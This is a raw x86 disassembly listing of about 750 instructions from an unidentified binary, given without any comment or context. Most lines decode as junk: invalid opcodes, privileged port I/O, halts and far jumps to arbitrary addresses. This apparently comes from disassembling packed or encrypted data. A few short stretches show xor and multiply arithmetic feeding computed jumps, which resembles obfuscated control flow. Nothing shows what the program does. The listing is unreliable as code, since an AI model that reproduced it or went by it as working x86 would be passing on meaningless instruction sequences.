  40c72c:	xchg   ebx,eax
  40c72d:	xor    eax,0x736b2233
  40c732:	jmp    0x70fb:0x654fd62f
  40c739:	int3   
  40c73a:	xor    eax,0xe954c9e9
  40c73f:	and    bl,BYTE PTR [ebx+edi*2-0x22f3d359]
  40c746:	pop    ecx
  40c747:	test   al,0xf
  40c749:	xor    eax,0xba780c12
  40c74e:	jo     0x40c6f9
  40c750:	fistp  DWORD PTR [edx]
  40c752:	jne    0x40c725
  40c754:	sete   bl
  40c757:	out    0xa2,eax
  40c759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c75a:	add    eax,0xa9dc0b0
  40c75f:	mov    bh,0xfd
  40c761:	data16 cmc 
  40c763:	mov    edx,0x51466027
  40c768:	sbb    DWORD PTR [edi+0x3558fd84],edi
  40c76e:	retf   
  40c76f:	adc    ah,BYTE PTR [esi+0x6]
  40c772:	rcr    DWORD PTR [ebx+0x47],1
  40c775:	cmp    al,0x9d
  40c777:	mov    eax,ds:0x1df9489b
  40c77c:	dec    ebp
  40c77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c77e:	bound  ebx,QWORD PTR [ebx+eax*4+0x1e5a257b]
  40c785:	cmp    al,0x57
  40c787:	(bad)
  40c78c:	pop    edi
  40c78d:	sub    BYTE PTR [edx],dl
  40c78f:	pop    ds
  40c790:	aad    0x61
  40c792:	lea    esp,[ecx]
  40c794:	fwait
  40c795:	mov    DWORD PTR [ecx+0x6c],ecx
  40c798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c799:	nop
  40c79a:	cld    
  40c79b:	mov    edx,0xfa03e57c
  40c7a0:	push   0x94a96849
  40c7a5:	call   0x60b960a0
  40c7aa:	push   ds
  40c7ab:	and    BYTE PTR [esi-0x25],bh
  40c7ae:	ds test al,0xa7
  40c7b1:	pop    edi
  40c7b2:	scas   eax,DWORD PTR es:[edi]
  40c7b3:	inc    edi
  40c7b4:	sbb    edi,DWORD PTR [ebp+0x2b73c6b9]
  40c7ba:	add    eax,0x521a45a6
  40c7bf:	nop
  40c7c0:	xor    ah,bl
  40c7c2:	ins    DWORD PTR es:[edi],dx
  40c7c3:	aaa    
  40c7c4:	xchg   DWORD PTR ds:0x868f56a2,ebp
  40c7ca:	in     al,0x44
  40c7cc:	push   ebx
  40c7cd:	add    al,0xd8
  40c7cf:	dec    ebp
  40c7d0:	mov    esi,0xf934a7fb
  40c7d5:	loope  0x40c7d6
  40c7d7:	jb     0x40c7ad
  40c7d9:	arpl   WORD PTR [ecx+edx*1+0x18],bp
  40c7dd:	fnstcw WORD PTR [ebp-0x33]
  40c7e0:	fcmovnb st,st(0)
  40c7e2:	cwde   
  40c7e3:	ins    DWORD PTR es:[edi],dx
  40c7e4:	adc    eax,0xadb48100
  40c7e9:	inc    ebx
  40c7ea:	inc    eax
  40c7eb:	push   ebp
  40c7ec:	dec    ebx
  40c7ed:	dec    eax
  40c7ee:	jg     0x40c7a8
  40c7f0:	fisubr WORD PTR [ebp-0x2494345c]
  40c7f6:	retf   0x93b
  40c7f9:	daa    
  40c7fa:	pop    es
  40c7fb:	mov    ch,0x22
  40c7fd:	bsf    edx,ebx
  40c800:	push   0xffffffb6
  40c802:	jl     0x40c835
  40c804:	push   es
  40c805:	hlt    
  40c806:	or     dh,BYTE PTR [ebp-0x75]
  40c809:	cmp    DWORD PTR [ecx],edi
  40c80b:	push   ebx
  40c80c:	mov    ah,0x9f
  40c80e:	ja     0x40c7c4
  40c810:	fwait
  40c811:	lock sub al,0xad
  40c814:	add    BYTE PTR [edi],0xab
  40c817:	jbe    0x40c79a
  40c819:	loop   0x40c7c0
  40c81b:	xor    ebp,0x43
  40c81e:	mov    edx,ebp
  40c820:	inc    edi
  40c821:	mov    edi,ecx
  40c823:	pop    edi
  40c824:	(bad)  
  40c825:	rcl    DWORD PTR [ebx-0x4a867509],1
  40c82b:	call   0x1ad74e52
  40c830:	and    al,0x78
  40c832:	popf   
  40c833:	inc    edx
  40c835:	inc    esp
  40c836:	dec    ebx
  40c837:	cmp    BYTE PTR [esi+0x2f1abf54],al
  40c83d:	mov    ds:0x336d99a4,eax
  40c842:	mov    WORD PTR [eax-0x70],ss
  40c845:	and    eax,0xf9afe4e6
  40c84a:	test   al,0xa4
  40c84c:	push   cs
  40c84d:	std    
  40c84e:	inc    edi
  40c84f:	sbb    al,0x7c
  40c851:	mov    dh,0x78
  40c853:	out    0xe9,al
  40c855:	sbb    edi,esi
  40c857:	mov    edi,0xdb6df5a
  40c85c:	xchg   BYTE PTR [eax],dh
  40c85e:	push   0xa304b781
  40c863:	jmp    0xfb2a:0xc090472
  40c86a:	jge    0x40c813
  40c86c:	fisub  DWORD PTR [esi]
  40c86e:	xchg   ecx,eax
  40c86f:	sub    bh,bl
  40c871:	pusha  
  40c872:	or     al,0xa0
  40c874:	cmp    al,0x38
  40c876:	aam    0x3f
  40c878:	loopne 0x40c84b
  40c87a:	pop    ebp
  40c87b:	mov    dh,0x92
  40c87d:	cmc    
  40c87e:	pop    ebp
  40c87f:	jo     0x40c882
  40c881:	mov    edi,0x2b110357
  40c886:	imul   edi,DWORD PTR [ebp-0x36c3e93d],0x76
  40c88d:	push   ebp
  40c88e:	test   DWORD PTR [edi],edx
  40c890:	out    0xde,eax
  40c892:	(bad)  
  40c893:	adc    esp,DWORD PTR ds:0xbda812ff
  40c899:	daa    
  40c89a:	mov    ds,WORD PTR [ebx-0x5c34c8d]
  40c8a0:	mov    eax,0x6f2a120d
  40c8a5:	push   edx
  40c8a6:	mov    eax,ds:0x552944c0
  40c8ab:	and    eax,DWORD PTR [edi-0x7b]
  40c8ae:	fisub  WORD PTR [edx-0x59]
  40c8b1:	jns    0x40c8e8
  40c8b3:	ret    
  40c8b4:	cmp    edx,DWORD PTR [ebp+0x2b193b4d]
  40c8ba:	dec    eax
  40c8bb:	push   ss
  40c8bc:	retf   
  40c8bd:	or     DWORD PTR [esi-0x7ace8773],edi
  40c8c3:	cmp    BYTE PTR [esi+eax*4+0x43],0x4b
  40c8c8:	lods   al,BYTE PTR ds:[esi]
  40c8c9:	xor    edi,DWORD PTR [edi-0x2e]
  40c8cc:	cmp    al,0xf9
  40c8ce:	cmp    ah,BYTE PTR [ecx+0x4e]
  40c8d1:	or     DWORD PTR ds:0x6bd30f5f,esp
  40c8d7:	ja     0x40c8af
  40c8d9:	xor    edi,0x6df8c772
  40c8df:	xchg   edi,eax
  40c8e0:	ss popa 
  40c8e2:	sahf   
  40c8e3:	pop    esi
  40c8e4:	pop    ecx
  40c8e5:	xchg   ecx,eax
  40c8e6:	dec    ebp
  40c8e7:	fmulp  st(1),st
  40c8ea:	dec    esi
  40c8eb:	fwait
  40c8ec:	inc    ebx
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	js     0x40c98d
  40c91a:	ret    
  40c91b:	js     0x40c909
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c8ae
  40c925:	xchg   edx,eax
  40c926:	push   cs
  40c927:	in     al,0x5e
  40c929:	xor    al,0xbf
  40c92b:	mov    WORD PTR [eax+esi*2-0x50f44d6f],fs
  40c932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c933:	leave  
  40c934:	(bad)
  40c937:	xchg   ebx,eax
  40c938:	test   ch,al
  40c93a:	(bad)  
  40c93b:	rep lods al,BYTE PTR ds:[esi]
  40c93d:	pop    ds
  40c93e:	sar    esp,1
  40c940:	mov    ebp,DWORD PTR [ebx-0x57a787a6]
  40c946:	jnp    0x40c989
  40c948:	je     0x40c8db
  40c94a:	popf   
  40c94b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c94c:	pop    ds
  40c94d:	dec    edi
  40c94e:	lods   al,BYTE PTR ds:[esi]
  40c94f:	mov    eax,eax
  40c951:	(bad)  
  40c952:	mov    bl,0xdd
  40c954:	int    0x8e
  40c956:	dec    eax
  40c957:	pop    ss
  40c958:	sbb    ch,dl
  40c95a:	xchg   ebx,eax
  40c95b:	test   eax,0x5b1924a2
  40c960:	mov    al,0x39
  40c962:	call   0xe84d93c9
  40c967:	pop    eax
  40c968:	pop    ecx
  40c969:	ja     0x40c972
  40c96b:	lock cmp esi,esp
  40c96e:	popf   
  40c96f:	in     al,0xe9
  40c971:	jmp    0x40c99a
  40c973:	mul    BYTE PTR [esi-0x1e]
  40c976:	mov    es,WORD PTR [ebx-0xf]
  40c979:	fwait
  40c97a:	push   esi
  40c97b:	xor    ah,bh
  40c97d:	daa    
  40c97e:	pusha  
  40c97f:	stos   BYTE PTR es:[edi],al
  40c980:	dec    eax
  40c981:	mov    bh,0x47
  40c983:	pop    ebx
  40c984:	out    0x6b,eax
  40c986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c987:	mov    edx,0x24b7c6ae
  40c98c:	ret    0xc6c8
  40c98f:	cld    
  40c990:	sar    BYTE PTR [ecx+0x4c],1
  40c993:	pop    es
  40c994:	cld    
  40c995:	hlt    
  40c996:	xor    BYTE PTR [ebp+0x26],ch
  40c999:	cdq    
  40c99a:	ss push ebx
  40c99c:	es ins DWORD PTR es:[edi],dx
  40c99e:	inc    edi
  40c99f:	in     eax,dx
  40c9a0:	pop    edi
  40c9a1:	dec    ebx
  40c9a2:	jg     0x40ca01
  40c9a4:	lahf   
  40c9a5:	or     DWORD PTR [eax+0x524e3c94],ecx
  40c9ab:	int    0x21
  40c9ad:	test   al,0x43
  40c9af:	fsub   DWORD PTR [ebx-0x2bc32e25]
  40c9b5:	stc    
  40c9b6:	repz fisttp DWORD PTR gs:[ecx+0x38]
  40c9bb:	addr16 out dx,eax
  40c9bd:	fimul  DWORD PTR [edi+0x3e7986a3]
  40c9c3:	and    DWORD PTR [ebp-0x354e8c2c],ebx
  40c9c9:	jae    0x40c9c8
  40c9cb:	add    ch,bl
  40c9cd:	stos   DWORD PTR es:[edi],eax
  40c9ce:	adc    eax,0xb0a0a113
  40c9d3:	sub    al,0x93
  40c9d5:	rcl    DWORD PTR [ebp+0x4],0x51
  40c9d9:	or     DWORD PTR [ecx-0x28],esi
  40c9dc:	pop    edx
  40c9dd:	jecxz  0x40c963
  40c9df:	aaa    
  40c9e0:	xchg   esp,eax
  40c9e1:	push   edi
  40c9e2:	shl    BYTE PTR [ebx+0x2b33f27f],1
  40c9e8:	pop    edi
  40c9e9:	call   0x407aaf47
  40c9ee:	pop    ecx
  40c9ef:	or     edi,eax
  40c9f1:	mov    DWORD PTR [ebx+0x1eff7f64],0x8ee6dd2b
  40c9fb:	inc    edi
  40c9fc:	es in  eax,dx
  40c9fe:	idiv   DWORD PTR [esp+edi*4-0x54]
  40ca02:	rcr    DWORD PTR [esi+ecx*1-0x55e119ef],cl
  40ca09:	or     eax,0x78328e0b
  40ca0e:	(bad)  
  40ca0f:	or     eax,0xf67fa0d6
  40ca14:	outs   dx,DWORD PTR ds:[esi]
  40ca15:	rcr    edi,0x8
  40ca18:	jle    0x40c9e4
  40ca1a:	pop    es
  40ca1b:	ret    0x9255
  40ca1e:	fld    DWORD PTR [edx]
  40ca20:	sahf   
  40ca21:	xchg   ebx,edx
  40ca23:	fdiv   QWORD PTR [ecx+0x4cd88083]
  40ca29:	rcl    DWORD PTR [edi],cl
  40ca2b:	mov    edi,0xc137fc8f
  40ca30:	xchg   esi,eax
  40ca31:	mov    al,ds:0xe8b688a4
  40ca36:	cld    
  40ca37:	popa   
  40ca38:	sub    edx,DWORD PTR [ebp-0x6cbae404]
  40ca3e:	mov    ds:0x10a9739e,al
  40ca43:	mov    ds:0xdb42a5df,eax
  40ca48:	jnp    0x40ca67
  40ca4a:	out    0xae,eax
  40ca4c:	pop    edx
  40ca4d:	or     BYTE PTR [esi],bh
  40ca4f:	cmp    eax,0xe4089c96
  40ca54:	enter  0x72b7,0x65
  40ca58:	mov    bh,0xb3
  40ca5a:	call   0x104c6d4f
  40ca5f:	aad    0xfd
  40ca61:	ret    
  40ca62:	cmp    al,0xf9
  40ca64:	adc    eax,0x92f9a62a
  40ca69:	shl    cl,0x42
  40ca6c:	pop    ecx
  40ca6d:	fs inc ebp
  40ca6f:	mov    edx,0xc1e9960d
  40ca74:	cmp    al,0xa0
  40ca76:	sbb    DWORD PTR [ecx+0x338331a5],esi
  40ca7c:	rol    BYTE PTR [eax],0x69
  40ca7f:	stos   DWORD PTR es:[edi],eax
  40ca80:	and    BYTE PTR [ecx],dh
  40ca82:	pop    ss
  40ca83:	add    BYTE PTR [edx],ch
  40ca85:	scas   eax,DWORD PTR es:[edi]
  40ca86:	push   ds
  40ca87:	mov    BYTE PTR [ebp+0x2a],0xed
  40ca8b:	imul   esp,ebp,0xffffff85
  40ca8e:	leave  
  40ca8f:	fnstsw WORD PTR [ebx+0xe]
  40ca92:	push   es
  40ca93:	imul   ebp,edi,0xc1ac2ffc
  40ca99:	xchg   BYTE PTR [ebp+ecx*1+0x9ee764b],ch
  40caa0:	rcl    BYTE PTR [esi+0x327f0372],1
  40caa6:	fucom  st(0)
  40caa8:	mov    ah,0xb6
  40caaa:	repz data16 xchg di,ax
  40caae:	fnstsw WORD PTR [edi+0x159776c2]
  40cab4:	add    eax,0x3c2c87a7
  40cab9:	sub    BYTE PTR [esp+eiz*2+0x7e],dl
  40cabd:	imul   edx,DWORD PTR [eax],0x50000699
  40cac3:	xor    eax,0xb1d463ea
  40cac8:	pop    esp
  40cac9:	mov    ebx,fs
  40cacb:	push   0xa481e0c0
  40cad0:	or     ah,BYTE PTR [ebx-0x7c32c622]
  40cad6:	rcr    eax,cl
  40cad8:	mov    cl,0x2f
  40cada:	jmp    0xe116b669
  40cadf:	(bad)  
  40cae0:	push   ss
  40cae1:	fcomp  st(2)
  40cae3:	mov    edi,0x3f7cd552
  40cae8:	stos   BYTE PTR es:[edi],al
  40cae9:	lock lods eax,DWORD PTR ds:[esi]
  40caeb:	mov    eax,fs
  40caed:	(bad)  
  40caee:	out    0x55,al
  40caf0:	inc    esi
  40caf1:	xor    ebx,DWORD PTR [edi-0x5b7cff18]
  40caf7:	dec    ecx
  40caf8:	fwait
  40caf9:	cmp    al,0x4f
  40cafb:	mov    ebx,0xe48b3520
  40cb00:	ret    
  40cb01:	shl    bh,1
  40cb03:	retf   
  40cb04:	pop    ds
  40cb05:	dec    esi
  40cb06:	(bad)
  40cb0a:	retf   0xbc80
  40cb0d:	in     eax,0x8
  40cb0f:	lods   eax,DWORD PTR ds:[esi]
  40cb10:	inc    esi
  40cb11:	jecxz  0x40cb3d
  40cb13:	cmp    DWORD PTR [ecx+edx*2-0x69],eax
  40cb17:	scas   eax,DWORD PTR es:[edi]
  40cb18:	aaa    
  40cb19:	push   ss
  40cb1a:	cli    
  40cb1b:	add    eax,0x71518e90
  40cb20:	push   ebp
  40cb21:	(bad)  
  40cb22:	xor    eax,0x8151f24e
  40cb27:	arpl   WORD PTR [edi-0x4d],bp
  40cb2a:	in     al,0xe8
  40cb2c:	mov    eax,0xd4a563ba
  40cb31:	sbb    BYTE PTR [ebp+eax*8+0x49],bl
  40cb35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb36:	dec    edx
  40cb37:	dec    esp
  40cb38:	mov    edx,0x938ff698
  40cb3d:	outs   dx,BYTE PTR ds:[esi]
  40cb3e:	pushf  
  40cb3f:	push   ds
  40cb40:	push   0x370fa44a
  40cb45:	xor    ecx,0xdd788e7e
  40cb4b:	xlat   BYTE PTR ds:[ebx]
  40cb4c:	sbb    al,0x2e
  40cb4e:	and    al,0x15
  40cb50:	adc    BYTE PTR [esi],dl
  40cb52:	ror    BYTE PTR [ecx],1
  40cb54:	in     eax,0x6b
  40cb56:	rcr    BYTE PTR [ebx-0x35],1
  40cb59:	and    eax,0x186b4bfc
  40cb5e:	dec    esi
  40cb5f:	xor    edi,DWORD PTR [ebx+0x7a0a0a8b]
  40cb65:	test   BYTE PTR [esi+0x70],0xe9
  40cb69:	mov    ds:0x138aac76,eax
  40cb6e:	jl     0x40cbc1
  40cb70:	mov    al,ds:0xfbde9806
  40cb75:	idiv   BYTE PTR [eax-0x37fa75cb]
  40cb7b:	jmp    0x4dbf:0xb527912d
  40cb82:	lods   al,BYTE PTR ds:[esi]
  40cb83:	pop    ebx
  40cb84:	or     dl,ch
  40cb86:	(bad)  
  40cb87:	out    dx,eax
  40cb88:	xor    DWORD PTR [edi+eiz*4],0x3736ce4b
  40cb8f:	xchg   ebx,eax
  40cb90:	mul    DWORD PTR [ebx+0x48]
  40cb93:	rcl    DWORD PTR [edx+eax*4],0x27
  40cb97:	fwait
  40cb98:	dec    edx
  40cb99:	and    al,0x70
  40cb9b:	aam    0xb3
  40cb9d:	cmc    
  40cb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb9f:	mov    dh,0xb7
  40cba1:	cmc    
  40cba2:	data16 cs cs pop ax
  40cba7:	test   eax,0x414b9593
  40cbac:	fs push 0x9604c496
  40cbb2:	sub    dh,BYTE PTR [edi+0x3e]
  40cbb5:	daa    
  40cbb6:	push   esi
  40cbb7:	push   ebx
  40cbb8:	pop    eax
  40cbb9:	xor    al,0xe6
  40cbbb:	cmp    al,0xd5
  40cbbd:	xchg   ebx,eax
  40cbbe:	mov    ds:0x2d9a5776,eax
  40cbc3:	int3   
  40cbc4:	push   edi
  40cbc5:	cs push esp
  40cbc7:	sbb    BYTE PTR [ebp+edx*4-0x4001e759],0xc8
  40cbcf:	pop    esi
  40cbd0:	xor    BYTE PTR [edi-0x12],ah
  40cbd3:	repnz sbb dh,BYTE PTR [edx-0x76e37770]
  40cbda:	push   esi
  40cbdb:	pop    eax
  40cbdc:	mov    ah,0xe3
  40cbde:	not    DWORD PTR [edx-0x76]
  40cbe1:	fwait
  40cbe2:	xchg   edx,eax
  40cbe3:	inc    eax
  40cbe4:	or     ebx,DWORD PTR [edi+0x3a]
  40cbe7:	cmp    al,BYTE PTR ds:0x89956b7b
  40cbed:	imul   esi,DWORD PTR [eax+edi*8],0x56
  40cbf1:	cwde   
  40cbf2:	jno    0x40cbff
  40cbf4:	jb     0x40cb92
  40cbf6:	pop    ebp
  40cbf7:	pop    ds
  40cbf8:	and    bh,BYTE PTR [edi-0x56]
  40cbfb:	sti    
  40cbfc:	jge    0x40cc7b
  40cbfe:	shl    BYTE PTR [ebx],cl
  40cc00:	jbe    0x40cc58
  40cc02:	dec    esp
  40cc03:	adc    ecx,DWORD PTR [ebx-0xacc2d92]
  40cc09:	xor    BYTE PTR [esi],bl
  40cc0b:	or     eax,DWORD PTR [ecx]
  40cc0d:	mov    eax,0x42502ced
  40cc12:	mov    esp,0x3a7b6a8f
  40cc17:	push   ecx
  40cc18:	mov    eax,ds:0xa4f5bb1c
  40cc1d:	ror    ebp,1
  40cc1f:	jmp    0x1c85df47
  40cc24:	fdivrp st(4),st
  40cc26:	add    DWORD PTR [eax-0x635ca2d4],edx
  40cc2c:	jno    0x40cc15
  40cc2e:	test   cl,cl
  40cc30:	mov    ebp,0x10cef810
  40cc35:	mov    ebx,0x5f6df061
  40cc3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc3b:	xchg   esp,eax
  40cc3c:	(bad)  
  40cc3d:	ds mov dh,0x9f
  40cc40:	ja     0x40cc75
  40cc42:	ins    BYTE PTR es:[edi],dx
  40cc43:	mov    esi,0x404f1eb0
  40cc48:	ins    BYTE PTR es:[edi],dx
  40cc49:	fidivr DWORD PTR [ebp+0x673e97da]
  40cc4f:	jnp    0x40ccb9
  40cc51:	sub    BYTE PTR [ebx-0xc],dh
  40cc54:	neg    BYTE PTR [ebx]
  40cc56:	test   BYTE PTR [ecx+0x558b24e7],bh
  40cc5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc5d:	mov    DWORD PTR [esi],esp
  40cc5f:	nop
  40cc60:	xlat   BYTE PTR ds:[ebx]
  40cc61:	and    eax,0xa668433b
  40cc66:	push   esp
  40cc67:	in     eax,0x2a
  40cc69:	ret    0x1736
  40cc6c:	push   eax
  40cc6d:	test   al,0x5f
  40cc6f:	mov    DWORD PTR [edi-0x1c],esi
  40cc72:	(bad)  
  40cc73:	fs (bad) 
  40cc76:	xchg   ebp,eax
  40cc77:	icebp  
  40cc78:	mov    ah,BYTE PTR [edi-0x6a2bed58]
  40cc7e:	fwait
  40cc7f:	mov    al,0x6f
  40cc81:	stos   DWORD PTR es:[edi],eax
  40cc82:	xchg   edx,eax
  40cc83:	jo     0x40cd01
  40cc85:	sbb    ebx,0xffffffa8
  40cc88:	push   ebp
  40cc89:	inc    edx
  40cc8a:	cld    
  40cc8b:	in     al,0x2f
  40cc8d:	stc    
  40cc8e:	or     esp,edx
  40cc90:	mov    ds:0x9d709172,al
  40cc95:	xchg   ecx,eax
  40cc96:	clc    
  40cc97:	into   
  40cc98:	ret    
  40cc99:	jno    0x40cd09
  40cc9b:	mov    dh,0xd5
  40cc9d:	or     al,0x63
  40cc9f:	or     esp,DWORD PTR [ebx]
  40cca1:	test   DWORD PTR [esi+0x72],esp
  40cca4:	clc    
  40cca5:	mov    dh,0x55
  40cca7:	sbb    al,0xf4
  40cca9:	dec    edi
  40ccaa:	xor    eax,0x72667c0
  40ccaf:	add    DWORD PTR [eax-0x10e3127c],eax
  40ccb5:	inc    esi
  40ccb6:	sbb    BYTE PTR [edi+edx*1-0x74ff88af],al
  40ccbd:	inc    esp
  40ccbe:	jmp    0x71cc6363
  40ccc3:	js     0x40cd24
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	xor    DWORD PTR [edi-0x2a],0xffffffaa
  40cd19:	pusha  
  40cd1a:	or     edx,DWORD PTR [eax+0x7d9f7070]
  40cd20:	jo     0x40cd92
  40cd22:	inc    eax
  40cd23:	jo     0x40cd3e
  40cd25:	rcl    BYTE PTR [edx-0x4f],cl
  40cd28:	int3   
  40cd29:	add    DWORD PTR [eax+edx*1+0x41],esp
  40cd2d:	rol    DWORD PTR [ecx-0x51],cl
  40cd30:	in     al,dx
  40cd31:	mov    ebx,0x2b2c8ffd
  40cd36:	jnp    0x40ccca
  40cd38:	jge    0x40cd6d
  40cd3a:	jmp    DWORD PTR [edi]
  40cd3c:	call   0x3614d186
  40cd41:	cmp    DWORD PTR [eax+edx*2-0x56651ee2],esp
  40cd48:	sbb    BYTE PTR [edx-0xabf7c1c],0x24
  40cd4f:	lods   al,BYTE PTR ds:[esi]
  40cd50:	popa   
  40cd51:	jmp    0x55a2:0xb79ca9e6
  40cd58:	cmp    esi,DWORD PTR [eax]
  40cd5a:	lock out 0xc4,eax
  40cd5d:	aas    
  40cd5e:	cmp    eax,0x49449bcb
  40cd63:	mov    ds:0xca4025e5,al
  40cd68:	repnz out 0xfd,eax
  40cd6b:	cmp    al,0xde
  40cd6d:	inc    ebp
  40cd6e:	in     al,0x14
  40cd70:	add    eax,0x7fead2ff
  40cd75:	jmp    0x40cd3c
  40cd77:	arpl   WORD PTR [edx],si
  40cd79:	cmp    BYTE PTR [edx-0x5],0x4f
  40cd7d:	adc    bh,BYTE PTR ds:0xad62dfdb
  40cd83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd84:	je     0x40cdcc
  40cd86:	rcl    dl,1
  40cd88:	mov    dh,0x29
  40cd8a:	add    cl,BYTE PTR [ebp+edx*8-0x54]
  40cd8e:	sub    BYTE PTR [ebx-0x3b],bh
  40cd91:	xor    ah,dl
  40cd93:	arpl   dx,di
  40cd95:	mov    ch,0xea
  40cd97:	push   edi
  40cd98:	popf   
  40cd99:	out    dx,eax
  40cd9a:	fwait
  40cd9b:	xchg   edi,eax
  40cd9c:	icebp  
  40cd9d:	(bad)  
  40cd9e:	mov    esi,0x6b3403a1
  40cda3:	scas   eax,DWORD PTR es:[edi]
  40cda4:	stc    
  40cda5:	(bad)  
  40cda6:	(bad)  
  40cda7:	loopne 0x40cde4
  40cda9:	xchg   DWORD PTR [ebp+ebx*4+0x706e3676],esi
  40cdb0:	dec    esi
  40cdb1:	das    
  40cdb2:	iret   
  40cdb3:	jmp    0x82f40b1d
  40cdb8:	pop    ebx
  40cdb9:	xor    ch,dh
  40cdbb:	gs addr16 xchg esi,eax
  40cdbe:	push   edi
  40cdbf:	and    DWORD PTR [ebx+0x5e],eax
  40cdc2:	mov    ds:0x4f413919,eax
  40cdc7:	shl    ebp,0xbb
  40cdca:	mov    cl,0xe6
  40cdcc:	xor    dh,BYTE PTR [edi+0x54]
  40cdcf:	call   DWORD PTR [esi]
  40cdd1:	xchg   ecx,eax
  40cdd2:	push   edx
  40cdd3:	xor    eax,0x2bd63cf1
  40cdd8:	cmc    
  40cdd9:	add    BYTE PTR [eax*2+0x3697ff3],dh
  40cde0:	pop    ss
  40cde1:	or     esp,ebx
  40cde3:	aaa    
  40cde4:	jns    0x40cdf6
  40cde6:	xor    BYTE PTR [ebp+0x22],dh
  40cde9:	ret    0x7a6
  40cdec:	(bad)  
  40cded:	ficom  WORD PTR [edi+ebx*2-0x6b]
  40cdf1:	cs mov dl,0x41
  40cdf4:	ins    DWORD PTR es:[edi],dx
  40cdf5:	mul    BYTE PTR [eax+0x344a48ac]
  40cdfb:	inc    edi
  40cdfc:	mov    dh,0xa2
  40cdfe:	jecxz  0x40ce2d
  40ce00:	xchg   cl,ch
  40ce02:	mov    BYTE PTR ds:0x5eb3d6f4,bh
  40ce08:	jbe    0x40ce14
  40ce0a:	xchg   ecx,eax
  40ce0b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce0d:	pop    esi
  40ce0e:	mov    BYTE PTR [esi-0x3f],dl
  40ce11:	shr    DWORD PTR [ecx-0x37],0x7f
  40ce15:	mov    bh,BYTE PTR [edi-0x6a73c597]
  40ce1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce1c:	inc    eax
  40ce1d:	dec    edi
  40ce1e:	jl     0x40ce7e
  40ce20:	or     al,0xe4
  40ce22:	jge    0x40cdce
  40ce24:	mov    al,ds:0xd964154c
  40ce29:	sar    ebx,0x5b
  40ce2c:	mov    ch,0xd
  40ce2e:	cmp    eax,0xe9f74ddd
  40ce33:	or     al,0x43
  40ce35:	jb     0x40ce4b
  40ce37:	sub    bh,ah
  40ce39:	ret    
  40ce3a:	cli    
  40ce3b:	(bad)  
  40ce3c:	cmc    
  40ce3d:	aas    
  40ce3e:	jl     0x40ce0e
  40ce40:	cmp    al,0x2c
  40ce42:	sar    BYTE PTR [edi+0x5016faa0],1
  40ce48:	cli    
  40ce49:	daa    
  40ce4a:	lock add ebx,DWORD PTR [ebp+0x2]
  40ce4e:	xor    ah,cl
  40ce50:	jns    0x40ce79
  40ce52:	sbb    esp,edx
  40ce54:	xor    eax,0xa3a45940
  40ce59:	mov    eax,0xd4c3147a
  40ce5e:	push   ebx
  40ce5f:	xor    dh,ah
  40ce61:	pop    ss
  40ce62:	mov    bl,0x94
  40ce64:	mov    ebx,0xe9c3fef8
  40ce69:	and    ch,dh
  40ce6b:	lods   al,BYTE PTR ds:[esi]
  40ce6c:	mov    al,ds:0x24b20962
  40ce71:	addr16 js 0x40ce77
  40ce74:	outs   dx,BYTE PTR ds:[esi]
  40ce75:	cwde   
  40ce76:	test   ecx,edx
  40ce78:	icebp  
  40ce79:	imul   ecx,DWORD PTR [edx-0x58],0x39
  40ce7d:	and    ecx,DWORD PTR [edx+0x7]
  40ce80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce81:	data16 shr al,1
  40ce84:	or     BYTE PTR [eax-0x67],dl
  40ce87:	(bad)  
  40ce88:	jnp    0x40ce4c
  40ce8a:	aam    0xaf
  40ce8c:	dec    ecx
  40ce8d:	leave  
  40ce8e:	mov    ebp,0x6b52f85d
  40ce93:	adc    al,0x46
  40ce95:	inc    ebx
